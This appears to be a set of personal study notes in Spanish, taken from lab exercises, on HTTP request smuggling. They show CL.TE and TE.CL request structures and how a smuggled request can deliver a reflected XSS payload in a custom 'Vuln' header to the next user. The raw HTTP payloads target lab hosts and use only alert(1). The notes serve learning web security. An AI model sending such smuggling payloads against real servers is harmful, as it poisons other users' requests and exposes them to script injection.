considere una aplicación web que es vulnerable a una vulnerabilidad XSS reflejada en el header  HTTP personalizado `Vuln` a través de una solicitud como esta:

```http
GET / HTTP/1.1 
Host: vuln.htb
Vuln: "><script>alert(1)</script>
```

Si bien esto es un riesgo de seguridad, no se puede explotar en el mundo real, ya que no podemos obligar al navegador de la víctima a inyectar nuestra carga útil en un header HTTP. Sin embargo, en combinación con una vulnerabilidad de HTTP Request Smuggling, la vulnerabilidad puede aprovecharse.

Por ejemplo, si hay una vulnerabilidad `CL.TE`, podríamos armar la vulnerabilidad XSS reflejada con una solicitud maliciosa que se vea así:

```http
POST / HTTP/1.1
Host: vuln.htb
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Vuln: "><script>alert(1)</script>
Dummy:
```

Si la próxima solicitud que llega al servidor web es la solicitud de nuestra víctima, modificamos con éxito la solicitud de tal manera que ahora contiene la carga útil en el header `Vuln` desde la perspectiva del servidor web. Por lo tanto, la respuesta que recibe la víctima contiene la carga útil XSS y explotamos con éxito a nuestra víctima.

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

estrucutra de un TE.CL:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
(enter)
```

explotacion con el caso del anterior:

![[Pasted image 20230220204828.png]]


### Exploiting HTTP request smuggling to deliver reflected XSS

si encontramos un XSS reflejado en algun lugar de la pagina, podemos enviarlo en un **request smuggling**:

![[Pasted image 20230220223138.png]]

esto hara que se reflejo en otro usuario.

